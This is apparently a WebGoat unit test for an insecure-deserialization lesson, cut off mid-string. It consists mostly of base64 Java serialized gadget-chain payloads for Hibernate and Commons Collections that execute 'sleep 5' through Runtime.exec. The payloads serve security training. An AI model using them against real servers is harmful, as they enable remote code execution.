package org.owasp.webgoat.plugin;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.fail;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.io.Serializable;
import java.util.Base64;

import org.junit.Test;

public class DeserializeUnitTest {

	@Test
	public void solveAssignment() throws Exception {

		try {

			/* Hibernate2 InvalidClassException serialVersion... */
			String token = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGVLLRkFMaLDdQIADFoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7TAAJdHlwZVNjb3BldAAqTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlRmFjdG9yeSRUeXBlU2NvcGU7eHIAH29yZy5oaWJlcm5hdGUudHlwZS5BYnN0cmFjdFR5cGX6DMO0n0LdQQIAAHhwAAAAAAABcHBzcgAzb3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuUG9qb0NvbXBvbmVudFR1cGxpemVytZ5Tkmx3CPoCAARMAA5jb21wb25lbnRDbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7TAAJb3B0aW1pemVydAAwTG9yZy9oaWJlcm5hdGUvYnl0ZWNvZGUvc3BpL1JlZmxlY3Rpb25PcHRpbWl6ZXI7TAAMcGFyZW50R2V0dGVydAAfTG9yZy9oaWJlcm5hdGUvcHJvcGVydHkvR2V0dGVyO0wADHBhcmVudFNldHRlcnQAH0xvcmcvaGliZXJuYXRlL3Byb3BlcnR5L1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcs8SWGKuCeZ0AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAIFtMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9HZXR0ZXI7TAAMaW5zdGFudGlhdG9ydAAiTG9yZy9oaWJlcm5hdGUvdHVwbGUvSW5zdGFudGlhdG9yO1sAB3NldHRlcnN0ACBbTG9yZy9oaWJlcm5hdGUvcHJvcGVydHkvU2V0dGVyO3hwAAAAAAB1cgAgW0xvcmcuaGliZXJuYXRlLnByb3BlcnR5LkdldHRlcjv4lvypjfvjewIAAHhwAAAAAXNyADhvcmcuaGliZXJuYXRlLnByb3BlcnR5LkJhc2ljUHJvcGVydHlBY2Nlc3NvciRCYXNpY0dldHRlcuf8GjuY3XG8AgACTAAFY2xhenpxAH4AE0wADHByb3BlcnR5TmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdnIAHWNvbS5zdW4ucm93c2V0LkpkYmNSb3dTZXRJbXBszibYH0lzwgUCAAdMAARjb25udAAVTGphdmEvc3FsL0Nvbm5lY3Rpb247TAANaU1hdGNoQ29sdW1uc3QAEkxqYXZhL3V0aWwvVmVjdG9yO0wAAnBzdAAcTGphdmEvc3FsL1ByZXBhcmVkU3RhdGVtZW50O0wABXJlc01EdAAcTGphdmEvc3FsL1Jlc3VsdFNldE1ldGFEYXRhO0wABnJvd3NNRHQAJUxqYXZheC9zcWwvcm93c2V0L1Jvd1NldE1ldGFEYXRhSW1wbDtMAAJyc3QAFExqYXZhL3NxbC9SZXN1bHRTZXQ7TAAPc3RyTWF0Y2hDb2x1bW5zcQB-ACN4cgAbamF2YXguc3FsLnJvd3NldC5CYXNlUm93U2V0Q9EdpU3CseACABVJAAtjb25jdXJyZW5jeVoAEGVzY2FwZVByb2Nlc3NpbmdJAAhmZXRjaERpckkACWZldGNoU2l6ZUkACWlzb2xhdGlvbkkADG1heEZpZWxkU2l6ZUkAB21heFJvd3NJAAxxdWVyeVRpbWVvdXRaAAhyZWFkT25seUkACnJvd1NldFR5cGVaAAtzaG93RGVsZXRlZEwAA1VSTHEAfgAfTAALYXNjaWlTdHJlYW10ABVMamF2YS9pby9JbnB1dFN0cmVhbTtMAAxiaW5hcnlTdHJlYW1xAH4AKUwACmNoYXJTdHJlYW10ABBMamF2YS9pby9SZWFkZXI7TAAHY29tbWFuZHEAfgAfTAAKZGF0YVNvdXJjZXEAfgAfTAAJbGlzdGVuZXJzcQB-ACNMAANtYXB0AA9MamF2YS91dGlsL01hcDtMAAZwYXJhbXN0ABVMamF2YS91dGlsL0hhc2h0YWJsZTtMAA11bmljb2RlU3RyZWFtcQB-ACl4cHQAEGRhdGFiYXNlTWV0YURhdGFwcHBwcHBwcHBwdXIAGltMb3JnLmhpYmVybmF0ZS50eXBlLlR5cGU7fq-roeSVYZoCAAB4cAAAAAFxAH4AEXBzcQB-ACEAAAPwAQAAA-gAAAAAAAAAAgAAAAAAAAAAAAAAAAEAAAPsAHBwcHBwdAASVGhyZWFkLnNsZWVwKDUwMCk7c3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAApwcHBwcHBwcHBweHBzcgATamF2YS51dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHBwc3EAfgAzAAAAAAAAAAp1cQB-ADYAAAAKc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cP////9xAH4APnEAfgA-cQB-AD5xAH4APnEAfgA-cQB-AD5xAH4APnEAfgA-cQB-AD54cHBwcHNxAH4AMwAAAAAAAAAKdXEAfgA2AAAACnBwcHBwcHBwcHB4cQB-AAVzcQB-AAJxAH4AEXEAfgAxcQB-AEF4";
			       token = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGVLLRkFMaLDdQIADFoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7TAAJdHlwZVNjb3BldAAqTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlRmFjdG9yeSRUeXBlU2NvcGU7eHIAH29yZy5oaWJlcm5hdGUudHlwZS5BYnN0cmFjdFR5cGX6DMO0n0LdQQIAAHhwAAAAAAABcHBzcgAzb3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuUG9qb0NvbXBvbmVudFR1cGxpemVytZ5Tkmx3CPoCAARMAA5jb21wb25lbnRDbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7TAAJb3B0aW1pemVydAAwTG9yZy9oaWJlcm5hdGUvYnl0ZWNvZGUvc3BpL1JlZmxlY3Rpb25PcHRpbWl6ZXI7TAAMcGFyZW50R2V0dGVydAAfTG9yZy9oaWJlcm5hdGUvcHJvcGVydHkvR2V0dGVyO0wADHBhcmVudFNldHRlcnQAH0xvcmcvaGliZXJuYXRlL3Byb3BlcnR5L1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcs8SWGKuCeZ0AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAIFtMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9HZXR0ZXI7TAAMaW5zdGFudGlhdG9ydAAiTG9yZy9oaWJlcm5hdGUvdHVwbGUvSW5zdGFudGlhdG9yO1sAB3NldHRlcnN0ACBbTG9yZy9oaWJlcm5hdGUvcHJvcGVydHkvU2V0dGVyO3hwAAAAAAB1cgAgW0xvcmcuaGliZXJuYXRlLnByb3BlcnR5LkdldHRlcjv4lvypjfvjewIAAHhwAAAAAXNyADhvcmcuaGliZXJuYXRlLnByb3BlcnR5LkJhc2ljUHJvcGVydHlBY2Nlc3NvciRCYXNpY0dldHRlcuf8GjuY3XG8AgACTAAFY2xhenpxAH4AE0wADHByb3BlcnR5TmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdnIAHWNvbS5zdW4ucm93c2V0LkpkYmNSb3dTZXRJbXBszibYH0lzwgUCAAdMAARjb25udAAVTGphdmEvc3FsL0Nvbm5lY3Rpb247TAANaU1hdGNoQ29sdW1uc3QAEkxqYXZhL3V0aWwvVmVjdG9yO0wAAnBzdAAcTGphdmEvc3FsL1ByZXBhcmVkU3RhdGVtZW50O0wABXJlc01EdAAcTGphdmEvc3FsL1Jlc3VsdFNldE1ldGFEYXRhO0wABnJvd3NNRHQAJUxqYXZheC9zcWwvcm93c2V0L1Jvd1NldE1ldGFEYXRhSW1wbDtMAAJyc3QAFExqYXZhL3NxbC9SZXN1bHRTZXQ7TAAPc3RyTWF0Y2hDb2x1bW5zcQB-ACN4cgAbamF2YXguc3FsLnJvd3NldC5CYXNlUm93U2V0Q9EdpU3CseACABVJAAtjb25jdXJyZW5jeVoAEGVzY2FwZVByb2Nlc3NpbmdJAAhmZXRjaERpckkACWZldGNoU2l6ZUkACWlzb2xhdGlvbkkADG1heEZpZWxkU2l6ZUkAB21heFJvd3NJAAxxdWVyeVRpbWVvdXRaAAhyZWFkT25seUkACnJvd1NldFR5cGVaAAtzaG93RGVsZXRlZEwAA1VSTHEAfgAfTAALYXNjaWlTdHJlYW10ABVMamF2YS9pby9JbnB1dFN0cmVhbTtMAAxiaW5hcnlTdHJlYW1xAH4AKUwACmNoYXJTdHJlYW10ABBMamF2YS9pby9SZWFkZXI7TAAHY29tbWFuZHEAfgAfTAAKZGF0YVNvdXJjZXEAfgAfTAAJbGlzdGVuZXJzcQB-ACNMAANtYXB0AA9MamF2YS91dGlsL01hcDtMAAZwYXJhbXN0ABVMamF2YS91dGlsL0hhc2h0YWJsZTtMAA11bmljb2RlU3RyZWFtcQB-ACl4cHQAEGRhdGFiYXNlTWV0YURhdGFwcHBwcHBwcHBwdXIAGltMb3JnLmhpYmVybmF0ZS50eXBlLlR5cGU7fq-roeSVYZoCAAB4cAAAAAFxAH4AEXBzcQB-ACEAAAPwAQAAA-gAAAAAAAAAAgAAAAAAAAAAAAAAAAEAAAPsAHBwcHBwdAASVGhyZWFkLnNsZWVwKDUwMCk7c3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAApwcHBwcHBwcHBweHBzcgATamF2YS51dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHBwc3EAfgAzAAAAAAAAAAp1cQB-ADYAAAAKc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cP////9xAH4APnEAfgA-cQB-AD5xAH4APnEAfgA-cQB-AD5xAH4APnEAfgA-cQB-AD54cHBwcHNxAH4AMwAAAAAAAAAKdXEAfgA2AAAACnBwcHBwcHBwcHB4cQB-AAVzcQB-AAJxAH4AEXEAfgAxcQB-AEF4";
			token = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgALTAAFX25hbWVxAH4ACkwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGosr+ur4AAAAxADoHADgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAGAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlCgADABAMAAwADQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHABkBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAnAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAqAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwALAAtCgArAC4BABBqYXZhL2xhbmcvU3RyaW5nBwAwAQAHc2xlZXAgNQgAMgEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAA0ADUKACsANgEAHnlzb3NlcmlhbC9Qd25lcjIzNTgwODIzODg4MTQ1NgEAIEx5c29zZXJpYWwvUHduZXIyMzU4MDgyMzg4ODE0NTY7ACEAAQADAAEABQABABoABwAIAAEACQAAAAIACgAEAAEADAANAAEADgAAAC8AAQABAAAABSq3AA+xAAAAAgARAAAABgABAAAAHQASAAAADAABAAAABQATADkAAAABABUAFgACABcAAAAEAAEAGAAOAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAACAAEgAAACAAAwAAAAEAEwA5AAAAAAABABoAGwABAAAAAQAcAB0AAgABABUAHgACABcAAAAEAAEAGAAOAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAACMAEgAAACoABAAAAAEAEwA5AAAAAAABABoAGwABAAAAAQAfACAAAgAAAAEAIQAiAAMACAApAA0AAQAOAAAAIgAGAAIAAAAWpwADAUy4AC8EvQAxWQMSM1O2ADdXsQAAAAAAAgAjAAAAAgAkACUAAAAKAAEAAQAmACgACXVxAH4AGAAAAdTK/rq+AAAAMQAbBwACAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28HAAQBABBqYXZhL2xhbmcvT2JqZWN0BwAGAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlCgADABAMAAwADQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAGQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAANGb28AIQABAAMAAQAFAAEAGgAHAAgAAQAJAAAAAgAKAAEAAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAD7EAAAACABEAAAAGAAEAAAAnABIAAAAMAAEAAAAFABMAFAAAAAIAFQAAAAIAFgAXAAAACgABAAEAGAAaAAlwdAAEUHducnB3AQB4c3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF4" ;

			//Hibernate1 
			token = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGVLLRkFMaLDdQIADFoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7TAAJdHlwZVNjb3BldAAqTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlRmFjdG9yeSRUeXBlU2NvcGU7eHIAH29yZy5oaWJlcm5hdGUudHlwZS5BYnN0cmFjdFR5cGX6DMO0n0LdQQIAAHhwAAAAAAABcHBzcgAzb3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuUG9qb0NvbXBvbmVudFR1cGxpemVytZ5Tkmx3CPoCAARMAA5jb21wb25lbnRDbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7TAAJb3B0aW1pemVydAAwTG9yZy9oaWJlcm5hdGUvYnl0ZWNvZGUvc3BpL1JlZmxlY3Rpb25PcHRpbWl6ZXI7TAAMcGFyZW50R2V0dGVydAAfTG9yZy9oaWJlcm5hdGUvcHJvcGVydHkvR2V0dGVyO0wADHBhcmVudFNldHRlcnQAH0xvcmcvaGliZXJuYXRlL3Byb3BlcnR5L1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcs8SWGKuCeZ0AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAIFtMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9HZXR0ZXI7TAAMaW5zdGFudGlhdG9ydAAiTG9yZy9oaWJlcm5hdGUvdHVwbGUvSW5zdGFudGlhdG9yO1sAB3NldHRlcnN0ACBbTG9yZy9oaWJlcm5hdGUvcHJvcGVydHkvU2V0dGVyO3hwAAAAAAB1cgAgW0xvcmcuaGliZXJuYXRlLnByb3BlcnR5LkdldHRlcjv4lvypjfvjewIAAHhwAAAAAXNyADhvcmcuaGliZXJuYXRlLnByb3BlcnR5LkJhc2ljUHJvcGVydHlBY2Nlc3NvciRCYXNpY0dldHRlcuf8GjuY3XG8AgACTAAFY2xhenpxAH4AE0wADHByb3BlcnR5TmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAfTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHB0ABBvdXRwdXRQcm9wZXJ0aWVzcHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABFwc3EAfgAhAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGqcr-ur4AAAAyADkKAAMAIgcANwcAJQcAJgEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQATU3R1YlRyYW5zbGV0UGF5bG9hZAEADElubmVyQ2xhc3NlcwEANUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAKAEAM3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAqAQAKZ2V0U